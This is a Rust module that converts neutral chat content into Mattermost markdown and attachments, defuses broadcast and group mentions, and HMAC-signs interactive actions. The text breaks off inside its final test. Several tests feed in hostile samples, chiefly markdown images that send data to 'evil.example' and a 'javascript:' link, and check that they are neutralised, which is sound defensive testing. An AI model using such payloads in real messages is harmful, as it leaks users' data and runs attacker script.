//! Neutral content → Mattermost markdown / message attachments (docs/20 §Rendering).
//!
//! Everything here is pure: callers resolve mention references first
//! ([`mention_refs`]) and hand the answers in as [`Lookups`].

use std::collections::{HashMap, HashSet};

use aurora_channels::{Block, ButtonStyle, Card};
use base64::Engine;
use base64::engine::general_purpose::URL_SAFE_NO_PAD;
use hmac::{Hmac, KeyInit, Mac};
use serde_json::{Value, json};
use sha2::Sha256;
use uuid::Uuid;

/// Marker for the core's own `<@here>` while broadcast syntax is being defused.
const HERE: char = '\u{E000}';

/// Mention references found in neutral text that need resolving.
#[derive(Debug, Default, PartialEq, Eq)]
pub struct MentionRefs {
    pub users: Vec<String>,
    pub spaces: Vec<String>,
    /// Lowercase `@names` typed in the text (not `channel`/`all`/`here`, which are always
    /// defused): each is a user, a group or nothing — the connector asks the platform (D-271).
    pub names: Vec<String>,
}

/// Pre-resolved platform names for mention tokens.
#[derive(Debug, Default)]
pub struct Lookups {
    /// user id → username
    pub users: HashMap<String, String>,
    /// channel id → channel name
    pub spaces: HashMap<String, String>,
    /// Lowercase mention names of groups (custom and LDAP-synced): broadcasts, defused like
    /// `@channel` (D-271(c)).
    pub groups: HashSet<String>,
    /// Lowercase usernames that were looked up and exist: a single user's mention passes.
    pub known: HashSet<String>,
    /// The name lookup was unavailable (or too long to run): every `@name` that is not a known
    /// user is treated as a group — fail closed (D-271(c)).
    pub closed: bool,
    /// The names the lookup was asked about (`Some` once a lookup ran; `None` for pure rendering,
    /// where only the broadcast words, `groups` and `closed` defuse): a name in the final text
    /// that is not in here was never looked up and is treated as a group (D-271(c), review 4).
    pub resolved: Option<HashSet<String>>,
}

/// The mention name at the start of `rest` (which begins with `@`): username characters
/// (`a-z0-9._-`, any case), trailing `.`, `_`, `-` left out — the server reads `@channel.foo` as the
/// name `channel.foo` but `@channel.` as `channel` — as `(lowercase name, byte length with the @)`.
fn name_at(rest: &str) -> Option<(String, usize)> {
    let body = rest.strip_prefix('@')?;
    let n = body
        .find(|c: char| !(c.is_ascii_alphanumeric() || matches!(c, '.' | '_' | '-')))
        .unwrap_or(body.len());
    let name = body[..n].trim_end_matches(['.', '_', '-']);
    (!name.is_empty()).then(|| (name.to_ascii_lowercase(), 1 + name.len()))
}

/// The server does not read `@` after an ASCII letter or digit, or after another `@`, as a mention.
fn can_ping_after(text: &str, at: usize) -> bool {
    !text[..at]
        .chars()
        .next_back()
        .is_some_and(|c| c.is_ascii_alphanumeric() || c == '@')
}

fn is_broadcast_word(name: &str) -> bool {
    matches!(name, "channel" | "all" | "here")
}

fn mention_names(text: &str) -> Vec<String> {
    let mut out: Vec<String> = Vec::new();
    for (i, _) in text.match_indices('@') {
        if !can_ping_after(text, i) || text[..i].ends_with('<') {
            continue;
        }
        if let Some((name, _)) = name_at(&text[i..])
            && !is_broadcast_word(&name)
            && !out.contains(&name)
        {
            out.push(name);
        }
    }
    out
}

/// Parsed `<@user:ID>`, `<@bot:ID>`, `<#space:ID>` token.
enum Token<'a> {
    User(&'a str),
    Space(&'a str),
    Here,
}

fn parse_token(inner: &str) -> Option<Token<'_>> {
    if inner == "@here" {
        return Some(Token::Here);
    }
    if let Some(r) = inner
        .strip_prefix("@user:")
        .or_else(|| inner.strip_prefix("@bot:"))
    {
        return valid_ref(r).then_some(Token::User(r));
    }
    if let Some(r) = inner.strip_prefix("#space:") {
        return valid_ref(r).then_some(Token::Space(r));
    }
    None
}

fn valid_ref(r: &str) -> bool {
    !r.is_empty() && r.len() <= 128 && !r.contains(['<', '>', ' ', '\n'])
}

fn for_each_token<'a>(neutral: &'a str, mut f: impl FnMut(&'a str, Token<'a>) -> bool) {
    let mut rest = neutral;
    while let Some(start) = rest.find('<') {
        let tail = &rest[start..];
        match tail.find('>') {
            Some(end) => {
                let whole = &tail[..=end];
                if let Some(t) = parse_token(&tail[1..end])
                    && !f(whole, t)
                {
                    return;
                }
                rest = &tail[end + 1..];
            }
            None => return,
        }
    }
}

/// The user and space references mentioned in `neutral`.
pub fn mention_refs(neutral: &str) -> MentionRefs {
    let mut m = MentionRefs::default();
    for_each_token(neutral, |_, t| {
        match t {
            Token::User(r) if !m.users.iter().any(|x| x == r) => m.users.push(r.to_owned()),
            Token::Space(r) if !m.spaces.iter().any(|x| x == r) => m.spaces.push(r.to_owned()),
            _ => {}
        }
        true
    });
    // The connector converts before it renders (`<span></span>` between the letters of a name
    // is gone afterwards: `@dev<span></span>s` is `@devs`): the names come from both texts.
    m.names = mention_names(neutral);
    for n in mention_names(&crate::convert::convert(&neutral.replace(HERE, ""))) {
        if !m.names.contains(&n) {
            m.names.push(n);
        }
    }
    m
}

/// Neutral markdown → Mattermost markdown: mention tokens become `@username` /
/// `~channel`, platform broadcast syntax typed by anyone is defused, and only
/// the core's `<@here>` token becomes a live `@here`.
pub fn render_text(neutral: &str, lk: &Lookups) -> String {
    // The marker is private to this function: text carrying it cannot forge `@here`.
    let cleaned = neutral.replace(HERE, "");
    // (FIX-142, docs/20 §Rendering) constructs Mattermost lacks are converted first; native
    // ones pass through byte for byte. Tokens and broadcast words are handled below, on the
    // converted text.
    let cleaned = crate::convert::convert(&cleaned);
    let neutral = cleaned.as_str();
    let mut out = String::with_capacity(neutral.len());
    let mut rest = neutral;
    while let Some(start) = rest.find('<') {
        out.push_str(&rest[..start]);
        let tail = &rest[start..];
        let Some(end) = tail.find('>') else {
            out.push_str(tail);
            rest = "";
            break;
        };
        match parse_token(&tail[1..end]) {
            Some(Token::Here) => out.push(HERE),
            Some(Token::User(id)) => match lk.users.get(id) {
                Some(name) => {
                    out.push('@');
                    out.push_str(name);
                }
                None => out.push_str("[unknown user]"),
            },
            Some(Token::Space(id)) => match lk.spaces.get(id) {
                Some(name) => {
                    out.push('~');
                    out.push_str(name);
                }
                None => out.push_str("[unknown channel]"),
            },
            None => out.push_str(&tail[..=end]),
        }
        rest = &tail[end + 1..];
    }
    out.push_str(rest);
    // `defuse` skips the private-use marker, so the core's `<@here>` survives.
    let out = defuse(&out, lk).replace(HERE, "@here");
    // Last line of defence (FIX-142 review): nothing after the core's sanitizer may produce what
    // the sanitizer refuses. If the converted text holds an image, a link outside http/https/
    // mailto or an image opener, the whole text is posted as escaped plain text instead.
    if crate::convert::is_safe(&out) {
        out
    } else {
        tracing::warn!(
            "converted Mattermost text failed the safety re-check; posting it as plain text"
        );
        // A URL stays readable but is no URL to the server's preview fetch (`https:\//…`,
        // `ftp:\//…`, `www\.…`, D-270).
        let data =
            aurora_core::sanitize::markdown_as_data(&neutral_without_marker(neutral), usize::MAX);
        defuse(&aurora_core::sanitize::break_preview_urls(&data), lk)
    }
}

/// `neutral` with the private marker removed (the fallback never carries a live `@here`).
fn neutral_without_marker(neutral: &str) -> String {
    neutral.replace(HERE, "")
}

/// Whether the mention `name` (lowercase) would notify more than one person: `channel`, `all`,
/// `here`, a group, or — when the lookup was unavailable — any name that is not a known user.
fn pings_many(name: &str, lk: &Lookups) -> bool {
    let a_user =
        || lk.known.contains(name) || lk.users.values().any(|u| u.eq_ignore_ascii_case(name));
    is_broadcast_word(name)
        || lk.groups.contains(name)
        || (lk.closed && !a_user())
        // A name the lookup never saw (it came out of a conversion the lookup could not
        // foresee): fail closed.
        || lk.resolved.as_ref().is_some_and(|r| !r.contains(name) && !a_user())
}

/// Defuses every mention that would notify more than one person (D-271): `@channel`, `@all`,
/// `@here` (the core's own `<@here>` is a private marker here, untouched), a group's name and,
/// when `lk.closed`, any name that is not a known user — in any letter case, next to any
/// punctuation, inside emphasis, headings, quotes, lists, table cells and link labels (the
/// server reads the raw text, measured on 11.7.15 — `docs/20 §Rendering`). The word is wrapped
/// in an inline code span (`` `@channel` ``); in a link destination the `@` is percent-encoded;
/// after a backslash (which would escape the backtick) a zero-width space breaks it. Code is
/// never touched, and nothing in code notifies. One user's `@name` passes.
pub fn defuse(text: &str, lk: &Lookups) -> String {
    let code = crate::convert::code_ranges(text);
    let dests = crate::convert::link_dest_ranges(text);
    let inside = |rs: &[std::ops::Range<usize>], i: usize| rs.iter().any(|r| r.contains(&i));
    // A backtick that is not part of code is literal: one we add could pair with it.
    let stray = text
        .char_indices()
        .any(|(i, c)| c == '`' && !inside(&code, i));
    let mut out = String::with_capacity(text.len() + 8);
    let mut at = 0;
    for (i, _) in text.match_indices('@') {
        if i < at || inside(&code, i) || !can_ping_after(text, i) {
            continue;
        }
        let Some((name, len)) = name_at(&text[i..]) else {
            continue;
        };
        if !pings_many(&name, lk) {
            continue;
        }
        out.push_str(&text[at..i]);
        let word = &text[i..i + len];
        let backslashes = text[..i].chars().rev().take_while(|c| *c == '\\').count();
        if inside(&dests, i) {
            out.push_str("%40");
            out.push_str(&word[1..]);
        } else if backslashes % 2 == 1
            || stray
            || text[..i].ends_with('`')
            || text[i + len..].starts_with('`')
        {
            out.push('@');
            out.push('\u{200B}');
            out.push_str(&word[1..]);
        } else {
            out.push('`');
            out.push_str(word);
            out.push('`');
        }
        at = i + len;
    }
    out.push_str(&text[at..]);
    out
}

/// Keeps a person from smuggling neutral mention tokens through message text
/// (`<@here>`, `<@user:…>`): a zero-width space breaks the token.
/// A narration card (C-851, `20 §Rendering`): words only, no emoji, no ping, no link. Every
/// platform-supplied label (a tool's name, a `direct` conversation's summary) goes into a code
/// span, so a bare URL stays text (no link, no preview, D-270) and no mention inside it renders
/// (`@here`, `@all`, `<@user:…>`, a group: D-271); a backtick or an `@` in a label is replaced
/// or broken first, so a label can neither close its span nor ping where code spans do not
/// protect. The result is final platform markdown: it never goes through [`render_text`].
pub fn render_narration(n: &aurora_channels::Narration) -> String {
    use aurora_channels::{NarrationStatus as S, NarrationStepStatus as St};
    let header = match n.status {
        S::Running => "Working on it",
        S::Done => "Done",
        S::Failed | S::Stopped => "Stopped",
    };
    if n.collapsed {
        let steps = n.step_count.unwrap_or(0);
        let mut line = format!(
            "**{header}** · {steps} step{}",
            if steps == 1 { "" } else { "s" }
        );
        let failed = n.failed_count.unwrap_or(0);
        if failed > 0 {
            line.push_str(&format!(", {failed} failed"));
        }
        let secs = n.elapsed_ms.unwrap_or(0) / 1000;
        if secs >= 60 {
            line.push_str(&format!(" · {} min {} s", secs / 60, secs % 60));
        } else {
            line.push_str(&format!(" · {secs} s"));
        }
        return line;
    }
    let mut out = format!("**{header}**");
    for s in &n.steps {
        let state = match s.status {
            St::Running => "running",
            St::Ok => "done",
            St::Failed => "failed",
        };
        out.push_str(&format!("\n- {}: {state}", code_span(&s.name)));
        if let Some(d) = s.detail.as_deref().filter(|d| !d.is_empty()) {
            out.push_str(&format!(" · {}", code_span(d)));
        }
    }
    if n.earlier > 0 {
        out.push_str(&format!("\n- {} earlier", n.earlier));
    }
    out
}

/// `label` as a Markdown code span that cannot be closed from inside and carries no mention.
fn code_span(label: &str) -> String {
    let clean: String = label
        .chars()
        .map(|c| match c {
            '`' => '\'',
            '\n' | '\r' => ' ',
            c => c,
        })
        .collect::<String>()
        .replace('@', "@\u{200B}")
        .replace("<@", "<\u{200B}@");
    format!("`{clean}`")
}

pub fn neutralize_tokens(text: &str) -> String {
    text.replace("<@", "<\u{200b}@").replace("<#", "<\u{200b}#")
}

/// `base64url(HMAC-SHA256(key, token))`: the defence-in-depth signature of an
/// interactive action (Mattermost does not sign its callbacks).
pub fn sign(key: &[u8], token: &str) -> String {
    let Ok(mut mac) = Hmac::<Sha256>::new_from_slice(key) else {
        return String::new();
    };
    mac.update(token.as_bytes());
    URL_SAFE_NO_PAD.encode(mac.finalize().into_bytes())
}

/// Constant-time check of [`sign`].
pub fn verify(key: &[u8], token: &str, sig: &str) -> bool {
    let Ok(raw) = URL_SAFE_NO_PAD.decode(sig.as_bytes()) else {
        return false;
    };
    let Ok(mut mac) = Hmac::<Sha256>::new_from_slice(key) else {
        return false;
    };
    mac.update(token.as_bytes());
    mac.verify_slice(&raw).is_ok()
}

/// What card rendering needs beyond the card itself.
pub struct CardCtx<'a> {
    /// `<public>/mm/actions`; `None` when no public URL is configured.
    pub actions_url: Option<&'a str>,
    pub hmac_key: &'a [u8],
    pub integration_id: Uuid,
}

fn style(s: ButtonStyle) -> &'static str {
    match s {
        ButtonStyle::Primary => "primary",
        ButtonStyle::Danger => "danger",
        ButtonStyle::Default => "default",
    }
}

/// A card → one Mattermost message attachment. `lk` resolves mention tokens
/// inside card text. All text is defused.
pub fn render_attachment(card: &Card, ctx: &CardCtx<'_>, lk: &Lookups) -> Value {
    let t = |s: &str| render_text(s, lk);
    let mut title: Option<String> = None;
    let mut text: Vec<String> = Vec::new();
    let mut fields: Vec<Value> = Vec::new();
    let mut footer: Vec<String> = Vec::new();
    let mut actions: Vec<Value> = Vec::new();
    let mut n = 0u32;
    for b in &card.blocks {
        match b {
            Block::Header { text: h } => {
                if title.is_none() {
                    title = Some(t(h));
                } else {
                    text.push(format!("**{}**", t(h)));
                }
            }
            Block::Text { text: x } => text.push(t(x)),
            Block::Fields { pairs } => {
                for p in pairs {
                    let value = t(&p.value);
                    fields.push(json!({
                        "title": t(&p.label),
                        "short": value.chars().count() <= 40,
                        "value": value,
                    }));
                }
            }
            Block::Context { text: x } => footer.push(t(x)),
            Block::Link { label, url } => text.push(format!("[{}]({url})", t(label))),
            Block::Buttons { items } => {
                let Some(url) = ctx.actions_url else { continue };
                for it in items {
                    n += 1;
                    actions.push(json!({
                        "id": format!("act{n}"),
                        "name": t(&it.label),
                        "type": "button",
                        "style": style(it.style),
                        "integration": integration(url, ctx, &it.token),
                    }));
                }
            }
            Block::Select {
                placeholder,
                options,
                token,
            } => {
                let Some(url) = ctx.actions_url else { continue };
                n += 1;
                actions.push(json!({
                    "id": format!("act{n}"),
                    "name": t(placeholder),
                    "type": "select",
                    "options": options.iter()
                        .map(|o| json!({"text": t(&o.label), "value": o.value}))
                        .collect::<Vec<_>>(),
                    "integration": integration(url, ctx, token),
                }));
            }
            // `text_input` is not declared: the core's fallback removes inputs.
            Block::Input { .. } => {}
        }
    }
    let mut att = serde_json::Map::new();
    if let Some(title) = title {
        att.insert("title".into(), json!(title));
    }
    if !text.is_empty() {
        att.insert("text".into(), json!(text.join("\n\n")));
    }
    if !fields.is_empty() {
        att.insert("fields".into(), json!(fields));
    }
    if !footer.is_empty() {
        att.insert("footer".into(), json!(footer.join(" · ")));
    }
    if !actions.is_empty() {
        att.insert("actions".into(), json!(actions));
    }
    Value::Object(att)
}

fn integration(url: &str, ctx: &CardCtx<'_>, token: &str) -> Value {
    json!({
        "url": url,
        "context": {
            "token": token,
            "sig": sign(ctx.hmac_key, token),
            "iid": ctx.integration_id,
        }
    })
}

/// Neutral reaction name → Mattermost emoji name (1:1 for the known set).
pub fn emoji_name(neutral: &str) -> &'static str {
    match neutral {
        "white_check_mark" => "white_check_mark",
        "x" => "x",
        "hourglass_flowing_sand" => "hourglass_flowing_sand",
        _ => "eyes",
    }
}

#[cfg(test)]
#[allow(clippy::panic, clippy::unwrap_used, clippy::expect_used)]
mod tests {
    use super::*;
    use aurora_channels::{ButtonItem, Field};

    fn lk() -> Lookups {
        let mut l = Lookups::default();
        l.users.insert("u1".into(), "alice".into());
        l.spaces.insert("c1".into(), "general".into());
        l
    }

    /// FIX-142 review: text that reaches the connector with an image or a bad link in it (the
    /// core's sanitizer was bypassed) is posted as escaped plain text, never as the construct.
    #[test]
    fn text_the_core_would_have_refused_is_posted_as_plain_text() {
        for bad in [
            "![x](https://evil.example/?d=S)",
            "[x](javascript:alert(1))",
            "![x](https://evil.example/p.png =10x10)",
            "$![x](https://evil.example/?d=S)$",
        ] {
            let out = render_text(&format!("hello {bad}"), &lk());
            assert!(crate::convert::is_safe(&out), "{bad} -> {out}");
            assert!(out.starts_with("hello "), "{out}");
            assert!(out.contains("\\!") || !out.contains("!["), "{out}");
        }
        // Good text is not touched by the check.
        assert_eq!(
            render_text("a **b** [c](https://x.example)", &lk()),
            "a **b** [c](https://x.example)"
        );
    }

    #[test]
    fn mentions_are_resolved() {
        let t = render_text(
            "hi <@user:u1> and <@bot:u1> in <#space:c1> <@user:zz>",
            &lk(),
        );
        assert_eq!(t, "hi @alice and @alice in ~general [unknown user]");
        let r = mention_refs("<@user:a> <@bot:b> <@user:a> <#space:c> <@here> <x>");
        assert_eq!(r.users, ["a", "b"]);
        assert_eq!(r.spaces, ["c"]);
    }

    #[test]
    fn broadcasts_are_defused_but_core_here_is_live() {
        let t = render_text("ping @channel, @all and @here now. @ALL! <@here>", &lk());
        assert_eq!(t, "ping `@channel`, `@all` and `@here` now. `@ALL`! @here");
    }

    /// (FIX-142) An agent's formatted answer reaches Mattermost as written: native constructs
    /// byte for byte, the core's `<@here>` live, typed broadcast words defused inside bold.
    #[test]
    fn formatted_text_passes_through_and_broadcasts_stay_defused() {
        let md = "**Funny:** a `insufficient_scope` code\n\n| a | b |\n|---|---|\n| 1 | 2 |\n\n- [x] done\n";
        assert_eq!(render_text(md, &lk()), md);
        assert_eq!(
            render_text("<@here> **@channel** and *@all* in `@here`", &lk()),
            "@here **`@channel`** and *`@all`* in `@here`"
        );
        // Conversions and the token pass compose: an alert that mentions someone.
        assert_eq!(
            render_text("> [!WARNING]\n> ask <@user:u1>\n", &lk()),
            "> ⚠️ **Warning**\n>\n> ask @alice\n"
        );
    }

    fn d(s: &str) -> String {
        defuse(s, &Lookups::default())
    }

    #[test]
    fn defuse_keeps_ordinary_mentions_and_code() {
        assert_eq!(
            d("@allison @channels @here_x"),
            "@allison @channels @here_x"
        );
        assert_eq!(d("`@channel` already"), "`@channel` already");
        assert_eq!(d("``a @all b`` @all"), "``a @all b`` `@all`");
        assert_eq!(d("```\n@here\n```\n@here"), "```\n@here\n```\n`@here`");
        // (a stray backtick: ours could pair with it, so a zero-width space breaks the word)
        assert_eq!(d("unclosed ` @all"), "unclosed ` @\u{200B}all");
        // (superset: only an ASCII letter or digit in front makes it no mention on the server)
        assert_eq!(d("é@all"), "é`@all`");
        // Names the server reads as a longer name are no mention of `channel`, `all`, `here`.
        for same in [
            "@channelx",
            "@channel.foo",
            "@channel-foo",
            "@channel_foo",
            "@here.foo",
            "@all-foo",
            "@all1",
            "x@channel",
            "1@here",
            "foo@all.example.com",
            "@@channel",
            "~~~\n@all\n~~~",
            "    @channel (indented code)",
            "\n    @here\n",
        ] {
            assert_eq!(d(same), same, "{same:?}");
        }
    }

    /// D-271 (a)(b): every spelling the pinned dev server (Mattermost 11.7.15) notifies on —
    /// measured through the members' `mention_count` (`docs/20 §Rendering`, mentions table) —
    /// is defused: any letter case, punctuation either side (including `_`, `-`, `.`, a
    /// backslash), inside emphasis, headings, quotes, lists, table cells and link labels.
    #[test]
    fn every_spelling_mattermost_pings_on_is_defused() {
        for (src, want) in [
            ("@Channel", "`@Channel`"),
            ("@CHANNEL", "`@CHANNEL`"),
            ("@cHaNnEl", "`@cHaNnEl`"),
            ("@All and @ALL", "`@All` and `@ALL`"),
            ("@Here @HERE", "`@Here` `@HERE`"),
            ("@channel.", "`@channel`."),
            ("@channel,", "`@channel`,"),
            ("@channel:", "`@channel`:"),
            ("@channel!", "`@channel`!"),
            ("@channel?", "`@channel`?"),
            ("@channel;", "`@channel`;"),
            ("@channel)", "`@channel`)"),
            ("(@channel)", "(`@channel`)"),
            ("[@channel]", "[`@channel`]"),
            ("\"@channel\" '@all'", "\"`@channel`\" '`@all`'"),
            (
                "@channel- @channel_ @channel..",
                "`@channel`- `@channel`_ `@channel`..",
            ),
            (
                "@channel’s @channel… @channel— @channel(",
                "`@channel`’s `@channel`… `@channel`— `@channel`(",
            ),
            ("_@channel", "_`@channel`"),
            (
                ".@here -@here /@here <@here\u{200B}>",
                ".`@here` -`@here` /`@here` <`@here`\u{200B}>",
            ),
            ("#@all >@all &@all", "#`@all` >`@all` &`@all`"),
            (":tada:@channel", ":tada:`@channel`"),
            (
                "**@channel** _@all_ ~~@here~~ *@channel*",
                "**`@channel`** _`@all`_ ~~`@here`~~ *`@channel`*",
            ),
            ("# @channel", "# `@channel`"),
            ("> @channel", "> `@channel`"),
            ("- @all\n1. @here", "- `@all`\n1. `@here`"),
            ("| a |\n|---|\n| @channel |", "| a |\n|---|\n| `@channel` |"),
            (
                "[@channel](https://x.example)",
                "[`@channel`](https://x.example)",
            ),
            (
                "[x @all y](https://x.example)",
                "[x `@all` y](https://x.example)",
            ),
            ("@channel/@all", "`@channel`/`@all`"),
            ("@channel\n@all", "`@channel`\n`@all`"),
            // A backslash in front would escape the opening backtick: a zero-width space instead.
            ("\\@channel", "\\@\u{200B}channel"),
            ("\\\\@channel", "\\\\`@channel`"),
        ] {
            assert_eq!(d(src), want, "{src:?}");
        }
    }

    /// Inserted backticks must not pair with the author's: a stray backtick anywhere, a backtick
    /// right next to the word or a backslash in front means a zero-width space instead (found by
    /// the pipeline property: `` ` @devs … <code>@here</code> `` re-paired and freed `@devs`).
    #[test]
    fn a_defused_word_never_changes_what_is_code_around_it() {
        let mut lk = Lookups::default();
        lk.groups.insert("devs".into());
        for (src, want) in [
            ("` @channel", "` @\u{200B}channel"),
            ("a ` b @all c", "a ` b @\u{200B}all c"),
            ("`x`@here", "`x`@\u{200B}here"),
            ("@here`x`", "@\u{200B}here`x`"),
            ("``a`` @all `b` @here", "``a`` `@all` `b` `@here`"),
            // (the first pair of backticks is a code span around the names; the last one is stray)
            ("` @devs @Devs ` @here `", "` @devs @Devs ` @\u{200B}here `"),
        ] {
            assert_eq!(defuse(src, &lk), want, "{src:?}");
        }
    }

    /// A link destination is no place for a backtick: the `@` is percent-encoded there.
    #[test]
    fn a_ping_word_inside_a_link_destination_is_percent_encoded() {
        assert_eq!(
            d("[x](https://a.example/@channel) and [y](https://a.example/p?q=@all)"),
            "[x](https://a.example/%40channel) and [y](https://a.example/p?q=%40all)"
        );
        assert_eq!(
            d("[x][r]\n\n[r]: https://a.example/@here"),
            "[x][r]\n\n[r]: https://a.example/%40here"
        );
    }

    /// D-271 (c)(d): a group's mention name is a broadcast like `@channel`; one user's name passes;
    /// when the lookup was unavailable every name that is not a known user is treated as a group.
    #[test]
    fn group_mentions_are_defused_and_unresolved_names_fail_closed() {
        let mut lk = Lookups::default();
        lk.groups.insert("devs".into());
        lk.known.insert("alice".into());
        for (src, want) in [
            ("@devs", "`@devs`"),
            ("@Devs.", "`@Devs`."),
            ("**@DEVS**", "**`@DEVS`**"),
            ("[@devs](https://x.example)", "[`@devs`](https://x.example)"),
            ("@alice and @Alice.", "@alice and @Alice."),
            ("@devs.sub", "@devs.sub"),
            ("`@devs`", "`@devs`"),
            ("@stranger", "@stranger"),
        ] {
            assert_eq!(defuse(src, &lk), want, "{src:?}");
        }
        lk.closed = true;
        for (src, want) in [
            ("@stranger and @alice", "`@stranger` and @alice"),
            ("@stranger.name!", "`@stranger.name`!"),
            ("mail me@example.com", "mail me@example.com"),
            ("`@stranger`", "`@stranger`"),
        ] {
            assert_eq!(defuse(src, &lk), want, "{src:?}");
        }
        // A person the core mentions by token is a user, resolved and live even when closed.
        let mut lk2 = lk_with_alice();
        lk2.closed = true;
        assert_eq!(
            render_text("hi <@user:u1> and @bob", &lk2),
            "hi @alice and `@bob`"
        );
    }

    fn lk_with_alice() -> Lookups {
        lk()
    }

    /// Review 4: the connector's own HTML conversion can join a name (`@dev<span></span>s` →
    /// `@devs`): the names to look up come from the CONVERTED text, and a name in the final text
    /// that was not looked up is treated as a group.
    #[test]
    fn names_are_read_from_the_converted_text_and_unlooked_up_names_are_groups() {
        for src in [
            "ping @dev<span></span>s",
            "ping @dev<sub>s</sub>",
            "ping @de<sup>vs</sup>",
            "ping @d<mark>ev</mark>s",
            "ping @dev<small></small>s",
        ] {
            let r = mention_refs(src);
            assert!(r.names.contains(&"devs".to_owned()), "{src}: {:?}", r.names);
        }
        // The lookup answered for `devs` (a group) → defused; a name that was never looked up
        // → defused too (a lookup that ran says nothing about a name it did not see).
        let mut lk = Lookups {
            resolved: Some(["alice".to_owned()].into_iter().collect()),
            ..Lookups::default()
        };
        lk.known.insert("alice".into());
        assert_eq!(defuse("@alice @devs", &lk), "@alice `@devs`");
        lk.groups.insert("devs".into());
        lk.resolved.as_mut().unwrap().insert("devs".into());
        assert_eq!(
            defuse("@alice @devs @other", &lk),
            "@alice `@devs` `@other`"
        );
        // A lookup that found a name to be neither user nor group lets it pass.
        lk.resolved.as_mut().unwrap().insert("other".into());
        assert_eq!(defuse("@other", &lk), "@other");
        // And end to end through `render_text`: the joined name is what the lookup was asked about.
        let neutral = "ping @dev<span></span>s";
        let mut lk = Lookups {
            resolved: Some(mention_refs(neutral).names.into_iter().collect()),
            ..Lookups::default()
        };
        lk.groups.insert("devs".into());
        assert_eq!(render_text(neutral, &lk), "ping `@devs`");
    }

    #[test]
    fn mention_names_lists_the_names_to_resolve() {
        let r = mention_refs(
            "hi @Alice, @bob.smith and @channel @all @here, x@mail.example <@user:u1> `@code` @devs!",
        );
        assert_eq!(r.names, ["alice", "bob.smith", "code", "devs"]);
    }

    #[test]
    fn typed_tokens_cannot_forge_mentions() {
        let n = neutralize_tokens("x <@here> <@user:u1> <#space:c1>");
        assert!(!n.contains("<@"));
        assert!(!n.contains("<#"));
        assert!(mention_refs(&n).users.is_empty());
    }

    #[test]
    fn signatures_round_trip_and_reject_tampering() {
        let key = b"k".repeat(32);
        let s = sign(&key, "v1.token");
        assert!(verify(&key, "v1.token", &s));
        assert!(!verify(&key, "v1.other", &s));
        assert!(!verify(b"other-key", "v1.token", &s));
        assert!(!verify(&key, "v1.token", ""));
        assert!(!verify(&key, "v1.token", "not base64 !!"));
    }

    fn step(
        name: &str,
        detail: Option<&str>,
        status: aurora_channels::NarrationStepStatus,
    ) -> aurora_channels::NarrationStep {
        aurora_channels::NarrationStep {
            name: name.to_owned(),
            detail: detail.map(str::to_owned),
            status,
        }
    }

    fn card(
        steps: Vec<aurora_channels::NarrationStep>,
        earlier: u32,
    ) -> aurora_channels::Narration {
        aurora_channels::Narration {
            turn_id: Uuid::nil().to_string(),
            status: aurora_channels::NarrationStatus::Running,
            steps,
            earlier,
            collapsed: false,
            step_count: None,
            failed_count: None,
            elapsed_ms: None,
        }
    }

    #[test]
    fn a_narration_card_lists_steps_as_code_spans_with_no_ping_and_no_link() {
        use aurora_channels::NarrationStepStatus as St;
        let n = card(
            vec![
                step("@here", None, St::Ok),
                step(
                    "@all <@user:U1> @devs",
                    Some("see https://evil.example/x `x`"),
                    St::Running,
                ),
                step("Bash", None, St::Failed),
            ],
            4,
        );
        let t = render_narration(&n);
        assert!(
            t.starts_with("**Working on it**\n- `@\u{200B}here`: done"),
            "{t}"
        );
        assert!(t.contains("- `Bash`: failed"), "{t}");
        assert!(t.ends_with("\n- 4 earlier"), "{t}");
        assert!(
            t.contains("`see https://evil.example/x 'x'`"),
            "the URL stays inside a code span: {t}"
        );
        // After defusing, no `@name`, `<@user:…>` token or hereless broadcast is left active.
        assert!(
            !t.contains("@here") && !t.contains("@all") && !t.contains("<@user"),
            "{t}"
        );
        assert!(
            !t.contains('😀') && !t.contains("]("),
            "no emoji, no link: {t}"
        );
        assert!(
            mention_refs(&t).users.is_empty() && mention_refs(&t).names.is_empty(),
            "{t}"
        );
    }

    #[test]
    fn a_full_card_fits_the_post_limit_and_the_collapsed_form_is_one_line() {
        use aurora_channels::NarrationStepStatus as St;
        let long = "x".repeat(120);
        let steps = (0..12).map(|_| step(&long, Some(&long), St::Ok)).collect();
        let t = render_narration(&card(steps, 99));
        assert!(t.chars().count() < 16_383, "{}", t.chars().count());
        let mut c = card(Vec::new(), 0);
        c.status = aurora_channels::NarrationStatus::Done;
        c.collapsed = true;
        c.step_count = Some(4);
        c.failed_count = Some(1);
        c.elapsed_ms = Some(75_000);
        assert_eq!(
            render_narration(&c),
            "**Done** · 4 steps, 1 failed · 1 min 15 s"
        );
        c.status = aurora_channels::NarrationStatus::Failed;
        c.step_count = Some(1);
        c.failed_count = Some(0);
        c.elapsed_ms = Some(2_000);
        assert_eq!(render_narration(&c), "**Stopped** · 1 step · 2 s");
    }

    fn ctx(key: &[u8]) -> CardCtx<'_> {
        CardCtx {
            actions_url: Some("https://c.example/mm/actions"),
            hmac_key: key,
            integration_id: Uuid::nil(),
        }
    }

    #[test]
    fn card_maps_to_an_attachment() {
        let key = b"k".repeat(32);
        let card = Card::new(vec![
            Block::header("Approval needed"),
            Block::text("Run <@user:u1>'s report"),
            Block::Fields {
                pairs: vec![
                    Field {
                        label: "Agent".into(),
                        value: "Research".into(),
                    },
                    Field {
                        label: "Why".into(),
                        value: "x".repeat(41),
                    },
                ],
            },
            Block::context("Research · via Daneel"),
            Block::link("Dashboard", "https://d.example/a").unwrap(),
            Block::buttons(vec![
                ButtonItem::new("Approve", ButtonStyle::Primary, "tok-a".into()),
                ButtonItem::new("Deny", ButtonStyle::Danger, "tok-d".into()),
            ])
            .unwrap(),
            Block::select("Pick", [("One".to_owned(), "1".to_owned())], "tok-s".into()).unwrap(),
        ])
        .unwrap();
        let a = render_attachment(&card, &ctx(&key), &lk());
        assert_eq!(a["title"], "Approval needed");
        assert_eq!(
            a["text"],
            "Run @alice's report\n\n[Dashboard](https://d.example/a)"
        );
        assert_eq!(a["footer"], "Research · via Daneel");
        assert_eq!(a["fields"][0]["short"], true);
        assert_eq!(a["fields"][1]["short"], false);
        let acts = a["actions"].as_array().unwrap();
        assert_eq!(acts.len(), 3);
        assert_eq!(acts[0]["type"], "button");
        assert_eq!(acts[0]["style"], "primary");
        assert_eq!(acts[1]["style"], "danger");
        assert_eq!(acts[2]["type"], "select");
        assert_eq!(acts[2]["options"][0]["text"], "One");
        let c = &acts[0]["integration"]["context"];
        assert_eq!(c["token"], "tok-a");
        assert!(verify(&key, "tok-a", c["sig"].as_str().unwrap()));
        assert_eq!(
            acts[0]["integration"]["url"],
